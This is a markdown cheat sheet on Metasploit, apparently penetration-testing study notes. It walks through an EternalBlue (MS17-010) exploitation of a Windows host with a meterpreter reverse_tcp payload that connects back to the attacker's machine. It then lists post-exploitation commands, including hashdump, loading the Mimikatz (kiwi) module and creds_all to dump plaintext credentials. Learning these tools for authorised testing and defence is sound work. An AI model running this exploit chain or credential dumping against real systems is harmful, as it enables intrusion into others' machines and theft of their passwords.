## Metasploit — full workflow explained

**Core 5-step pattern, same for every exploit:**
```
search <keyword>
use <exploit-path>
show options
set <OPTION> <value>
run / exploit
```

**Full example:**
```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <target-ip>
set LHOST <kali-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

**Key terms:**
- `RHOSTS` = target machine(s)
- `LHOST` = your Kali IP (where reverse shell connects back to)
- **Meterpreter** = advanced post-exploitation shell (far more capable than plain cmd/bash)
- `reverse_tcp` = target connects out to attacker (bypasses most firewalls — outbound rarely blocked)
- `bind_tcp` = attacker connects into target directly (needs inbound port open, rarer)
- `run` and `exploit` do the exact same thing (`exploit` is the older command name)

**Post-exploitation commands once you have a meterpreter session:**
```
sysinfo          # target OS info
getuid           # current privilege level
screenshot       # capture target's screen
hashdump         # dump password hashes
load kiwi        # load Mimikatz module
creds_all        # dump plaintext creds (after loading kiwi)
shell            # drop into normal cmd/bash on target
background       # pause session, return to msf6 prompt
sessions -l      # list active sessions
sessions -i 1    # resume session #1
```

